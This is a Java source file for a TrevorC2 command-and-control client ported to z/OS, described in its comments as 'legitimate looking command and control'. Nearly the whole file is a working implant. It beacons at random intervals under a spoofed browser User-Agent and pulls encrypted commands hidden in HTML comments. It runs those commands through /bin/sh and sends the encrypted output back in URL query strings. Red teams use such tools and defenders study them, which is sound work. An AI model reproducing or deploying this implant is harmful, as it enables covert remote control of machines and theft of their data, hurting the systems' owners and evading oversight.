import java.io.IOException;
import java.io.InputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.Random;
import java.net.CookieHandler;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.concurrent.TimeUnit;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.net.CookieManager;
import java.util.Formatter;
import java.io.Reader;
import java.nio.charset.Charset;


public class trevorc2_client {

    /* TrevorC2 - Java Client - legitimate looking command and control
    Written by: Soldier of FORTRAN @mainframed767
    GIT: https://github.com/mainframed

    Based on trevorc2_client.py from TrustedSec

    Built and runs on z/OS 

    This is the client connection, and only an example. Refer to the readme
    to build your own client connection to the server C2 infrastructure.

    compile with `javac trevorc2_client.java` run with `java trevorc2_client`

    */

    // CONFIG CONSTANTS:
    // site used to communicate with (remote TrevorC2 site)

    private static String SITE_URL = "http://127.0.0.1";

    // THIS IS WHAT PATH WE WANT TO HIT FOR CODE - YOU CAN MAKE THIS ANYTHING EXAMPLE: /index.aspx (note you need to change this as well on trevorc2_server)
    private static String ROOT_PATH_QUERY = "/";

    // THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
    private static String SITE_PATH_QUERY = "/images";

    // THIS IS THE QUERY STRING PARAMETER USED
    private static String QUERY_STRING = "guid=";

    // STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
    private static String STUB = "oldcss=";

    // time_interval is the time used between randomly connecting back to server, for more stealth, increase this time a lot and randomize time periods
    private static int time_interval1 = 2;
    private static int time_interval2 = 8;

    // THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
    private static String CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget");

    // DO NOT CHANGE BELOW THIS LINE

    private static int getRandomNumberInRange(int min, int max) {
        if (min >= max) {
            throw new IllegalArgumentException("max must be greater than min");
        }
        Random r = new Random();
        return r.nextInt((max - min) + 1) + min;
    }
 
    private static void ConnectTrevor() {
        while(true){
            String HOSTNAME = "";
            try {
                InetAddress machine = InetAddress.getLocalHost();
                HOSTNAME = "magic_hostname=" + machine.getHostName();
            } catch (UnknownHostException ex) {
                ex.printStackTrace();
            }
            try {
                String S = AES.encrypt(HOSTNAME, CIPHER);
                String HOSTNAME_SEND = Base64.getEncoder().encodeToString(S.getBytes("UTF-8"));
                String turl = SITE_PATH_QUERY + "?" + QUERY_STRING + HOSTNAME_SEND;
                URL url = new URL(SITE_URL + turl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();   
                connection.setRequestMethod("GET");
                connection.setRequestProperty("Accept-Encoding", "identity");
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko");
                connection.setRequestProperty("Connection", "close");
                connection.setReadTimeout(15*1000);
                connection.connect(); 
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                break;
            } catch (Exception e) {
                System.out.println("[-] Failed to connect");
                System.out.println("[-] Error: " + e);
                int seconds = getRandomNumberInRange(time_interval1,time_interval2);
                System.out.println(String.format("[-] Reconnecting in %d seconds", seconds));
               try { 
                   TimeUnit.SECONDS.sleep(seconds);
               } catch (Exception y_tho) {
                   // do nothing, just chill ok?
               }
            } 
        }
    }

    public static void main(String[] args) {
        CookieManager cookieManager = new CookieManager();
        CookieHandler.setDefault(cookieManager);
        String HOSTNAME = "";
        String HOST = "";     
        try {
            InetAddress machine = InetAddress.getLocalHost();
            HOSTNAME =  machine.getHostName();
        } catch (UnknownHostException ex) {
            ex.printStackTrace();
        }
        ConnectTrevor();
        while(true) {
            int seconds = getRandomNumberInRange(time_interval1,time_interval2);
            try { 
                TimeUnit.SECONDS.sleep(seconds);
            } catch (Exception y_tho) {
                   // do nothing, just chill ok?
            }
            // Time to connect
            try {
                URL url = new URL(SITE_URL + ROOT_PATH_QUERY);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();   
                connection.setRequestMethod("GET");
                connection.setRequestProperty("Accept-Encoding", "identity");
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko");
                connection.setRequestProperty("Connection", "close");
                connection.setRequestProperty("Content-Length", "1000");
                connection.setReadTimeout(15*1000);
                connection.connect();
                String b64Data = "";
                InputStream inputStream = connection.getInputStream();
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                String line = bufferedReader.readLine();
                int count = 0;
                while (line != null) {
                    if (count % 100 == 1 ) {
                        System.out.print(" .");
                    }
                    count++;
                    line = bufferedReader.readLine();
                    if (line.contains("<!-- " + STUB)) {
                        b64Data = line.split("<!-- " + STUB)[1].split(" -->")[0];
                        break;
                    }
                }
                bufferedReader.close();
                connection.disconnect();
                String parse = AES.decrypt(b64Data, CIPHER);
                if (parse.equals("nothing")) {
                    // Do nothing like it says
                } else if (parse.contains(HOSTNAME)) {
                    String cmd = parse.split(HOSTNAME+"::::")[1];
                    ProcessBuilder processBuilder = new ProcessBuilder();
                    processBuilder.command("/bin/sh","-c", cmd);
                    processBuilder.redirectErrorStream(true);
                    try {
                        Process process = processBuilder.start();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        String cmdLine;
                        StringBuilder sb = new StringBuilder();
                        while ((cmdLine = reader.readLine()) != null) {
                            sb.append(cmdLine+"\n");
                        }
                        String b64out = AES.encrypt(HOSTNAME+"::::"+sb.toString(), CIPHER);
                        String CMD_SEND = Base64.getEncoder().encodeToString(b64out.getBytes("UTF-8"));
                        String turl = SITE_PATH_QUERY + "?" + QUERY_STRING + CMD_SEND;
                        URL surl = new URL(SITE_URL + turl);
                        HttpURLConnection sconnection = (HttpURLConnection) surl.openConnection();   
                        sconnection.setRequestMethod("GET");
                        sconnection.setRequestProperty("Accept-Encoding", "identity");
                        sconnection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko");
                        sconnection.setRequestProperty("Connection", "close");
                        sconnection.setReadTimeout(15*1000);
                        sconnection.connect(); 
                        BufferedReader sreader = new BufferedReader(new InputStreamReader(sconnection.getInputStream()));
                    }   catch (IOException e) {
                        e.printStackTrace();
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            } catch (Exception e) {
                System.out.println("[-] Failed to connect");
                System.out.println("[-] Error: " + e);
            }
        }
    }
} // end trevorc2_client

// AES from https://gist.github.com/itarato/abef95871756970a9dad
class AES {

    private static Charset UTF8_CHARSET = Charset.forName("UTF-8");
    
    public static String decodeUTF8(byte[] bytes) {
        return new String(bytes, UTF8_CHARSET);
    }

    public static byte[] encodeUTF8(String string) {
        return string.getBytes(UTF8_CHARSET);
    }

    public static String encrypt(String plainText, String key) throws Exception {
        byte[] clean = plainText.getBytes("UTF-8");
        // Generating IV.
        int ivSize = 16;
        byte[] iv = new byte[ivSize];
        SecureRandom random = new SecureRandom();
        random.nextBytes(iv);
        IvParameterSpec ivParameterSpec = new IvParameterSpec(iv);
        // Hashing key.
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        digest.update(key.getBytes("UTF-8"));
        byte[] keyBytes = new byte[32];
        // This will typically be installed already but
        // this will cause an error unless you download this: https://public.dhe.ibm.com/ibmdl/export/pub/systems/cloud/runtimes/java/security/jce_policy/
        // and install it according to this: https://www.ibm.com/developerworks/community/blogs/a9ba1efe-b731-4317-9724-a181d6155e3a/entry/error_illegal_key_size_when_trying_to_generate_a_certificate_signing_request?lang=en
        // More info: https://www.ibm.com/support/knowledgecenter/SSYKE2_8.0.0/com.ibm.java.security.component.80.doc/security-component/sdkpolicyfiles.html
        System.arraycopy(digest.digest(), 0, keyBytes, 0, keyBytes.length);
        SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
        // Encrypt.
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivParameterSpec);
        byte[] encrypted = cipher.doFinal(clean);
        // Combine IV and encrypted part.
        byte[] encryptedIVAndText = new byte[ivSize + encrypted.length];
        System.arraycopy(iv, 0, encryptedIVAndText, 0, ivSize);
        System.arraycopy(encrypted, 0, encryptedIVAndText, ivSize, encrypted.length);
        return Base64.getEncoder().encodeToString(encryptedIVAndText);
    }

    public static String decrypt(String encryptedIvText, String key) throws Exception {
        int ivSize = 16;
        int keySize = 32;
        byte[] encryptedIvTextBytes = Base64.getDecoder().decode(encryptedIvText);
        // Extract IV.
        byte[] iv = new byte[ivSize];
        System.arraycopy(encryptedIvTextBytes, 0, iv, 0, iv.length);
        IvParameterSpec ivParameterSpec = new IvParameterSpec(iv);
        // Extract encrypted part.
        int encryptedSize = encryptedIvTextBytes.length - ivSize;
        byte[] encryptedBytes = new byte[encryptedSize];
        System.arraycopy(encryptedIvTextBytes, ivSize, encryptedBytes, 0, encryptedSize);
        // Hash key.
        byte[] keyBytes = new byte[keySize];
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        md.update(key.getBytes("UTF-8"));
        System.arraycopy(md.digest(), 0, keyBytes, 0, keyBytes.length);
        SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
        // Decrypt.
        Cipher cipherDecrypt = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipherDecrypt.init(Cipher.DECRYPT_MODE, secretKeySpec, ivParameterSpec);
        byte[] decrypted = cipherDecrypt.doFinal(encryptedBytes);
        String ebcdic = decodeUTF8(decrypted);
        String OS = System.getProperty("os.name").toLowerCase();   
        if (OS.equals("z/os")) {  
            return new String(ebcdic);
        } else {
            return new String(decrypted);
        }
    }
}
